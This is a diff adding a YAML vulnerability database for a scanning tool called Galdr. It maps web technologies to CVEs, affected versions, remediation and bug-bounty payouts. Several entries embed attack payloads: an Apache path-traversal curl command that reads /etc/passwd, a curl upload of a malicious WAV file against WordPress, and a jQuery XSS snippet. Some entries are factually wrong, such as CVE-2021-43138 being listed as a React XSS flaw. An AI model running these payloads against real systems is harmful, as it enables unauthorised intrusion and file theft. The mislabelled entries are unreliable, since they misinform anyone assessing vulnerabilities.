@@ -1,0 +1,136 @@
+# Galdr CVE Database
+# Maps technologies to known vulnerabilities with exploit information
+
+technologies:
+  wordpress:
+    - cve: "CVE-2021-29447"
+      description: "XML External Entity Processing in Media Library"
+      cvss_score: 7.5
+      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      affected_versions: ">=5.7 <5.7.2"
+      exploit:
+        type: "public"
+        source: "exploit-db"
+        reference: "https://www.exploit-db.com/exploits/49908"
+        weaponized: true
+        curl_poc: |
+          curl -X POST "http://target/wp-admin/admin-ajax.php" \
+          -H "Content-Type: multipart/form-data" \
+          -F "action=wp_handle_upload" \
+          -F "file=@malicious.wav"
+      attack_vector: "XXE via media upload"
+      remediation: "Update to WordPress 5.7.2+"
+      bounty:
+        platforms: ["hackerone", "bugcrowd"]
+        avg_payout: 2500
+
+    - cve: "CVE-2022-21661"
+      description: "SQL Injection in WP_Query"
+      cvss_score: 8.8
+      affected_versions: ">=3.7 <5.8.3"
+      exploit:
+        type: "public"
+        weaponized: false
+      attack_vector: "SQL injection via order parameter"
+      remediation: "Update to WordPress 5.8.3+"
+
+  apache:
+    - cve: "CVE-2021-41773"
+      description: "Path Traversal in Apache HTTP Server 2.4.49"
+      cvss_score: 9.8
+      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      affected_versions: "2.4.49"
+      exploit:
+        type: "public"
+        source: "github"
+        reference: "https://github.com/blasty/CVE-2021-41773"
+        weaponized: true
+        curl_poc: |
+          curl -s --path-as-is "http://target:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      attack_vector: "URL-encoded path traversal"
+      remediation: "Update to Apache 2.4.50+"
+      bounty:
+        platforms: ["hackerone"]
+        avg_payout: 5000
+
+    - cve: "CVE-2021-42013"
+      description: "Path Traversal and RCE in Apache 2.4.50"
+      cvss_score: 9.8
+      affected_versions: "2.4.50"
+      exploit:
+        type: "public"
+        weaponized: true
+      attack_vector: "Path traversal leading to RCE"
+      remediation: "Update to Apache 2.4.51+"
+
+  nginx:
+    - cve: "CVE-2021-23017"
+      description: "Off-by-one in Nginx resolver"
+      cvss_score: 8.6
+      affected_versions: "0.6.18-1.20.0"
+      exploit:
+        type: "limited"
+        weaponized: false
+      attack_vector: "DNS resolver exploitation"
+      remediation: "Update to Nginx 1.20.1+"
+
+  php:
+    - cve: "CVE-2021-21702"
+      description: "NULL Pointer Dereference in SoapClient"
+      cvss_score: 7.5
+      affected_versions: "7.3.x <7.3.33, 7.4.x <7.4.26, 8.0.x <8.0.13"
+      exploit:
+        type: "public"
+        weaponized: false
+      attack_vector: "SOAP client exploitation"
+      remediation: "Update PHP to latest version"
+
+  django:
+    - cve: "CVE-2022-34265"
+      description: "SQL Injection via Trunc database function"
+      cvss_score: 9.8
+      affected_versions: "3.2.x <3.2.14, 4.0.x <4.0.6"
+      exploit:
+        type: "proof-of-concept"
+        weaponized: false
+      attack_vector: "SQL injection via database functions"
+      remediation: "Update Django framework"
+
+  react:
+    - cve: "CVE-2021-43138"
+      description: "XSS in development mode"
+      cvss_score: 6.1
+      affected_versions: ">=16.0.0 <16.14.0, >=17.0.0 <17.0.2"
+      exploit:
+        type: "public"
+        weaponized: false
+      attack_vector: "Cross-site scripting"
+      remediation: "Update React to latest version"
+
+  jquery:
+    - cve: "CVE-2020-11022"
+      description: "XSS via HTML manipulation methods"
+      cvss_score: 6.9
+      affected_versions: ">=1.2 <3.5.0"
+      exploit:
+        type: "public"
+        weaponized: true
+        curl_poc: |
+          # XSS payload via jQuery HTML manipulation
+          <script>$('<img src=x onerror=alert(1)>').appendTo('body')</script>
+      attack_vector: "DOM-based XSS"
+      remediation: "Update jQuery to 3.5.0+"
+      bounty:
+        platforms: ["hackerone", "bugcrowd"]
+        avg_payout: 1500
+
+    - cve: "CVE-2020-11023"
+      description: "XSS via jQuery.htmlPrefilter"
+      cvss_score: 6.9
+      affected_versions: ">=1.0.3 <3.5.0"
+      exploit:
+        type: "public"
+        weaponized: true
+      attack_vector: "DOM-based XSS"
+      remediation: "Update jQuery to 3.5.0+"
+
